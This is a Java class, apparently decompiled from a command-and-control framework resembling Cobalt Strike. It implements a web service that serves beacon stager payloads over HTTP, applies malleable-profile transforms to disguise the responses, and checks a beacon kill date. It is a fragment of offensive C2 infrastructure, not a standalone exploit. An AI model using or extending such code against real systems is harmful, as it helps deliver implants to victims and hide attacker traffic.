package c2profile;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import common.CommonUtils;

import java.io.ByteArrayInputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

public class MalleableStager implements WebService {
    protected Profile profile;

    protected byte[] resource;

    protected String key;

    protected String arch;

    protected String ex_uri = null;

    public MalleableStager(Profile profile, String string1, byte[] arrby, String string2) {
        this.resource = arrby;
        this.profile = profile;
        this.key = string1;
        this.arch = string2;
    }

    public void setup(WebServer webServer, String string) {
        webServer.register(string, this);
        if (this.profile.hasString(this.key + ".uri_" + this.arch)) {
            this.ex_uri = this.profile.getString(this.key + ".uri_" + this.arch);
            webServer.registerSecondary(this.ex_uri, this);
        }
        checkKillDate();
    }

    public void checkKillDate() {
        if (this.profile.hasString(".killdate")) {
            long l = CommonUtils.parseDate(this.profile.getString(".killdate"), "yyyy-MM-dd");
            if (l < System.currentTimeMillis())
                CommonUtils.print_warn("Beacon kill date " + this.profile.getString(".killdate") + " is in the past!");
        }
    }

    public Response serve(String string1, String string2, Properties properties1, Properties properties2) {
        Response response = null;
        if (this.ex_uri != null && string1.equals(this.ex_uri)) {
            response = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(this.resource), this.resource.length);
            if (this.profile.hasString(this.key + ".server"))
                this.profile.apply(this.key + ".server", response, this.resource);
        } else {
            response = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(new byte[0]), 0L);
            if (this.profile.hasString(this.key + ".server"))
                this.profile.apply(this.key + ".server", response, this.resource);
            response.data = new ByteArrayInputStream(this.resource);
            response.size = this.resource.length;
            response.offset = 0L;
            response.addHeader("Content-Length", this.resource.length + "");
        }
        checkKillDate();
        return response;
    }

    public String toString() {
        return "beacon stager " + this.arch;
    }

    public String getType() {
        return "beacon";
    }

    public List cleanupJobs() {
        return new LinkedList();
    }

    public boolean suppressEvent(String string) {
        return false;
    }

    public boolean isFuzzy() {
        return false;
    }
}
